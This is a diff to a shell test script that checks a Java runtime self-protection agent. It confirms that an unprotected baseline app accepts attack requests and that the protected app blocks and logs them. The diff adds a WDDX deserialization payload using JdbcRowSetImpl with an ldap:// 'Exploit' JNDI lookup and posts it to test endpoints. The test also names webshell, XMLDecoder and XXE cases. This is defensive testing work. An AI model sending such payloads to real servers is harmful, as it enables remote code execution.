@@ -76,11 +76,30 @@ wait_for() {
   exit 1
 }
 
+typed_payload_body() {
+  printf "%s" "argumentCollection=<wddxPacket version='1.0'><header/><data><struct type='xcom.sun.rowset.JdbcRowSetImplx'><var name='dataSourceName'><string>ldap://127.0.0.1:1389/Exploit</string></var><var name='autoCommit'><boolean value='true'/></var></struct></data></wddxPacket>"
+}
+
 expect_ok() {
   local prefix="$1"
   local name="$2"
   local url="$3"
   curl -fsS "$url" > "logs/${prefix}-baseline/${name}.response"
+  echo "baseline ${prefix} ${name}"
+}
+
+expect_form_ok() {
+  local prefix="$1"
+  local name="$2"
+  local url="$3"
+  curl -fsS -X POST -H "Content-Type: application/x-www-form-urlencoded" \
+    --data-binary "$(typed_payload_body)" \
+    "$url" > "logs/${prefix}-baseline/${name}.response"
+  if ! grep -q "typed payload attempted" "logs/${prefix}-baseline/${name}.response"; then
+    cat "logs/${prefix}-baseline/${name}.response" >&2
+    echo "baseline ${prefix} ${name} did not reach typed-payload endpoint" >&2
+    exit 1
+  fi
   echo "baseline ${prefix} ${name}"
 }
 
@@ -131,6 +150,33 @@ expect_block() {
   local log="logs/${prefix}-protected/events.jsonl"
   local status
   status="$(curl -sS -o "logs/${prefix}-protected/${name}.response" -w "%{http_code}" "${url}${path}" || true)"
+  if [[ "$status" =~ ^2 ]]; then
+    echo "protected ${prefix} ${name} unexpectedly returned ${status}" >&2
+    cat "logs/${prefix}-protected/${name}.response" >&2
+    exit 1
+  fi
+  if ! grep -q "\"algorithm\":\"${algorithm}\".*\"action\":\"block\"" "$log"; then
+    cat "$log" >&2
+    echo "missing protected ${prefix} ${name} block event for ${algorithm}" >&2
+    exit 1
+  fi
+  echo "blocked ${prefix} ${name}"
+}
+
+expect_block_form() {
+  local prefix="$1"
+  local url="$2"
+  local name="$3"
+  local algorithm="$4"
+  local path="$5"
+  local log="logs/${prefix}-protected/events.jsonl"
+  local status
+  status="$(curl -sS -o "logs/${prefix}-protected/${name}.response" \
+    -w "%{http_code}" \
+    -X POST \
+    -H "Content-Type: application/x-www-form-urlencoded" \
+    --data-binary "$(typed_payload_body)" \
+    "${url}${path}" || true)"
   if [[ "$status" =~ ^2 ]]; then
     echo "protected ${prefix} ${name} unexpectedly returned ${status}" >&2
     cat "logs/${prefix}-protected/${name}.response" >&2
@@ -232,6 +278,7 @@ run_matrix_entry() {
     path=${item#*:}
     expect_ok "$prefix" "$name" "${baseline_url}${path}"
   done
+  expect_form_ok "$prefix" typed_payload "${baseline_url}/rasp/java8/typed-payload"
   expect_upload_ok "$prefix" upload_java_archive "${baseline_url}/rasp/java8/plugin/add"
 
   expect_protected_normal "$prefix" "$protected_url"
@@ -256,6 +303,7 @@ run_matrix_entry() {
   expect_block "$prefix" "$protected_url" xml_decoder_runtime java8_xml_decoder_runtime_execution /rasp/java8/xml-decoder-runtime
   expect_block "$prefix" "$protected_url" xml_decoder_webshell java8_xml_decoder_script_file_write /rasp/java8/xml-decoder-webshell
   expect_block "$prefix" "$protected_url" jndi java8_jndi_remote_lookup /rasp/java8/jndi
+  expect_block_form "$prefix" "$protected_url" typed_payload java8_request_typed_payload_deserialization /rasp/java8/typed-payload
   expect_block "$prefix" "$protected_url" xxe_file java8_xxe_external_entity_protocol /rasp/java8/xxe-file
   expect_block_upload "$prefix" "$protected_url" upload_java_archive fileUpload_java_archive
 }
